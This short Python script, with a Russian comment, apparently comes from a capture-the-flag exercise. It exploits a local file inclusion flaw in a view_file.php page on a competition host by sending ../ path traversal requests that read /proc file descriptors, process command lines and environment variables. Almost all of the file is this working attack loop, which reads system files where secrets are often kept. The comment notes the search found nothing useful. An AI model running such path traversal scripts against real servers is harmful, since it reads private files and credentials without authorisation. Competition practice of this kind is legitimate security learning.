# перебор через Lfi файлов в proc  целью найти что то интересное, но выяснилось, что совсем не туда
import requests, time

# for N in range(20):
#     for K in range(20):
#         print(f"{N = }\t{K = }", end="\r")
#         stri = "http://bigsmokepages.vkactf.ru/view_file.php?file=../../../../proc/%i/fd/%i" % (N,K)
#         print(stri)
#         response = requests.get(stri)
#         contents = response.text
#         if "File not found or empty" in contents:
#             time.sleep(5)
#             continue
#         print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
#         print(contents)
#         print("===============================================================================")
#         time.sleep(5)

for N in range(0,50):
    #stri = "http://bigsmokepages.vkactf.ru/view_file.php?file=../../../../proc/%i/cmdline" % (N)
    stri = "http://bigsmokepages.vkactf.ru/view_file.php?file=../../../../proc/162/fd/%i" % (N)
    print(stri)
    response = requests.get(stri)
    contents = response.text
    if "File not found or empty" in contents:
        time.sleep(5)
        continue
    print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
    print(contents)
    print("===============================================================================")
    time.sleep(5)

    stri = "http://bigsmokepages.vkactf.ru/view_file.php?file=../../../../proc/%i/environ" % (N)
    print(stri)
    response = requests.get(stri)
    contents = response.text
    if "File not found or empty" in contents:
        time.sleep(5)
        continue
    print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
    print(contents)
    print("===============================================================================")
    time.sleep(5)